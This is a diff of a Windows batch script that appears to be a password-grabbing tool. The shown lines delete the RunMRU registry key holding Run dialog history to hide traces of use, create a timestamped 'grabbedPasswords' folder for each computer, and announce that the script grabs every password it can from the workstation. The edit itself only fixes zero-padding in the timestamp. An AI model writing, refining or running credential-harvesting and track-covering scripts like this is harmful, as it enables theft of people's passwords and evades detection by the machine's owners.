@@ -6,7 +6,8 @@ REM Delete registry keys storing Run dialog history
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 
 REM make a folder for where passwords will be stored. 
-set dst=%~dp0\grabbedPasswords\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
+set "$time=%time: =0%"
+set dst=%~dp0\grabbedPasswords\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%$time:~-11,2%%$time:~-8,2%%$time:~-5,2%
 mkdir %dst% >>nul
 
 REM runs all programs and grabs everything it can for password on the workstation.
